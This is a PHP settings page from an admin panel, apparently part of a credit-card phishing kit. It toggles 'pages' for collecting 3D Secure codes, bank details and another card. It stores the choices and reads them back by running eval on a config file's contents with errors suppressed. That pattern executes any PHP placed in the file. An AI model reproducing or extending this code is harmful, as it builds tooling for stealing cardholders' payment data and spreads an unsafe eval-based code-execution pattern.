<?php
require_once __DIR__ . '/../function.php';

$xconfig = false;
$actual_page = 'model';

if(isset($_POST['save'])) {
	$a = $_POST['3dsecure'];
  $b = $_POST['bank'];
  $c = $_POST['anothercard'];
	$api->setPage(array($a, $b, $c));
  $msg = '<div class="success">Changes have been saved!</div>';
}

if (file_exists($api->dir_config.'/'.$api->page_config)) {
  $xconfig = true;
  @eval(file_get_contents($api->dir_config.'/'.$api->page_config));
}
?>
<?php require 'page/header.php'; ?>
<div id="main">
<?php require 'page/sidebar.php'; ?>
<div class="content">
<div class="top-subhead">
<h2>Page Setting (new)</h2>
<div class="clear"></div>
</div>
<div class="full-container no-border">
<?php
if (isset($_POST['save'])) {
	echo $msg;
}
?>
<form method="post" action="" autocomplete="off">
<ul id="settings">
<li>
<div class="left">3D Secure</div>
<div class="right">
<select name="3dsecure">
<?php if($xconfig == true && $config_3dsecure == "enable") {
	echo '<option value="enable" selected>Enable</option>
<option value="disable">Disable</option>';
} else {
	echo '<option value="enable">Enable</option>
<option value="disable" selected>Disable</option>';
}
?>
</select>
</div>
</li>
<li>
<div class="left">Bank</div>
<div class="right">
<select name="bank">
<?php
if($xconfig == true && $config_bank == "enable") {
	echo '<option value="enable" selected>Enable</option>
<option value="disable">Disable</option>';
} else {
	echo '<option value="enable">Enable</option>
<option value="disable" selected>Disable</option>';
}
?>
</select>
</div>
</li>
<li>
<div class="left">Another Card</div>
<div class="right">
<select name="anothercard">
<?php
if($xconfig == true && $config_anothercard == "enable") {
	echo '<option value="enable" selected>Enable</option>
<option value="disable">Disable</option>';
} else {
	echo '<option value="enable">Enable</option>
<option value="disable" selected>Disable</option>';
}
?>
</select>
</div>
</li>
</ul>
<br>
<input type="submit" name="save" value="Save changes">
</form>
</div>
</div>
<div class="clear"></div>
</div>
</body>
</html>
